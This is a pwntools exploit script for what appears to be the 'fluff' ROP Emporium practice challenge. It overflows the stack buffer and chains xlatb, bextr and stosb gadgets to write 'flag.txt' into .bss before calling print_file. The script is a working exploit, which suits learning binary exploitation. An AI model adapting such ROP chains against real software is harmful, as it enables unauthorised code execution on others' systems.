from pwn import *

elf = ELF('../fluff/fluff')

p = process('../fluff/fluff')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('../fluff/fluff')
p.recvuntil(b'> ')

"""
0x0000000000400628: xlatb; ret;
0x00000000004006a3: pop rdi; ret;
0x0000000000400639: stosb byte ptr [rdi], al; ret;
0x0000000000400610: mov eax, 0 ; pop rbp ; ret
0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;

0x66        0x4003E2        ; f
0x6c        0x4003E5        ; l
0x61        0x40040B        ; a
0x67        0x4003CF        ; g
0x2e        0x4003C9        ; .
0x74        0x4003D5        ; t
0x78        0x4006C8        ; x
0x74        0x4003D5        ; t

rdi = bss
eax = 0
rbx = address
rax = [address]
[rdi] = al

"""
flag_parts = [0x4003E2, 0x4003E4, 0x40040C, 0x4003CF, 0x4003C9, 0x4003D5, 0x4006C8, 0x4003D5]
rax = [0xb, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]

print_file = elf.symbols['print_file']
location = elf.bss()

pop_rdi  = 0x4006a3
bextr    = 0x40062a
xlatb    = 0x400628
stosb    = 0x400639  
mov      = 0x400610

junk = b'A' * 0x20 + b'A' * 0x8
payload  = junk

for i in range(8):  
    payload += p64(bextr)
    payload += p64(0b1111111100000000)
    payload += p64(flag_parts[i] - rax[i] - 0x3ef2)      
    payload += p64(xlatb)
    payload += p64(pop_rdi)
    payload += p64(location + i)
    payload += p64(stosb)

payload += p64(pop_rdi)
payload += p64(location)
payload += p64(print_file)

p.sendline(payload)
p.interactive()